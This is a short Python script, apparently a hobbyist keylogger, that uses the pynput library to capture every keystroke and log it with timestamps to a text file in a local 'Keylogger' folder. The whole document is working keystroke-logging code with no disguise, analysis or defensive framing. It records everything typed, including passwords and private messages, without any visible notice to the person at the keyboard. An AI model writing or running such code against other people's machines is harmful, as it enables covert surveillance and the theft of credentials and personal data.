import logging
from pynput.keyboard import Key, Listener


# Your directory for saving raw log
log_dir = r"C:\Users\Badger\Desktop\Code\Keylogger\Log\ "

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")


def on_press(key):
    logging.info(key)


with Listener(on_press=on_press) as listener:
    listener.join()

